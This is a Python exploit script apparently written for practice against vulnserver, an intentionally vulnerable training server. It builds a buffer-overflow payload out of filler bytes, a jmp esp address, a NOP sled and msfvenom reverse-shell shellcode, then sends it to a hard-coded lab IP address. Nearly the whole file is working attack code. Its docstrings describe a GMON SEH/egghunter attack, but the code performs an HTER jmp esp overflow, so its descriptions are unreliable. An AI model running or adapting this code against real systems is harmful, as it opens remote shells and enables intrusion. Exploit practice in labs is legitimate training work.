#!/usr/bin/python3
"""Exploit code for vulnserver GMON seh overwrite with egghunter"""

import socket


def add_shellcode() -> bytes:
    """ Returns shellcode generated by msfvenom"""
    # msfvenom -p windows/shell_reverse_tcp lhost=eth0 lport=4444 -f hex EXITFUNC=thread -b "\x00"
    shellcode = b""
    shellcode += b"bba862840bdbc5d97424f45a29c9b152"
    shellcode += b"315a1283eafc03f26c66fefe99e401fe"
    shellcode += b"5989881b6889ef68db397b3cd0b229d4"
    shellcode += b"63b6e5dbc47dd0d2d52e2075562d7555"
    shellcode += b"67fe8894a0e361c4796fd7f80e25e473"
    shellcode += b"5cab6c6015ca5d372d957db6e2ad37a0"
    shellcode += b"e7888e5bd367118d2d87bef0817abe35"
    shellcode += b"2565b54f5518ce9427c65b0e8f8dfcea"
    shellcode += b"31419a793d2ee82522b13d5e5e3ac0b0"
    shellcode += b"d678e714b2db860d1e8db74dc1721206"
    shellcode += b"ec672f45794b027579c315064b4c8e80"
    shellcode += b"e7050857073cecc7f6bf0dce3ceb5d78"
    shellcode += b"9494357819419928b53a5a9875eb32f2"
    shellcode += b"79d423fd537dc9043442a665a72ab569"
    shellcode += b"36f7308f52171518cb8e3cd26a4eeb9f"
    shellcode += b"adc41860632d547214dd2328b3e29944"
    shellcode += b"5f7046941669d1c37f5f28816dc682b7"
    shellcode += b"6f9eed73b463f37a39dfd76c87e053d8"
    shellcode += b"57b70db61161fc60c8de56e48d2c6972"
    shellcode += b"92781f9a23d566a58cb16edef0219035"
    shellcode += b"b142739fccea2a4a6d77cda1b28e4e43"
    shellcode += b"4b754e264e31c8db222abddb914b94"
    return shellcode


def build_buf() -> bytes:
    """ Builds buffer for GMON exploit of vulnserver with egghunter"""
    # Bad chars: \x00
    # *************
    # Buffer Layout
    # *************
    #
    # HTER
    # Overwrite of 2041 bytes
    # jmp esp 625011F9
    # nop sled
    # shellcode in hex format
    # filler to 3000 bytes

    buf = b"HTER "
    buf += b"A" * 2041
    buf += b"bb115062"  # jmp esp
    buf += b"90" * 16  # nop sled
    buf += add_shellcode()
    buf += b"A" * (3000 - len(buf))
    return buf


def send_exploit(ip: str, port: int) -> None:
    """Sends exploit for vulnserver"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((ip, port))
        print(sock.recv(1024).decode())
    except Exception as msg:
        print(msg)
        exit()

    sock.settimeout(5)
    sock.send(build_buf())
    try:
        print(sock.recv(1024))
    except socket.timeout:
        pass
    finally:
        sock.close()


if __name__ == "__main__":
    send_exploit("192.168.99.100", 9999)
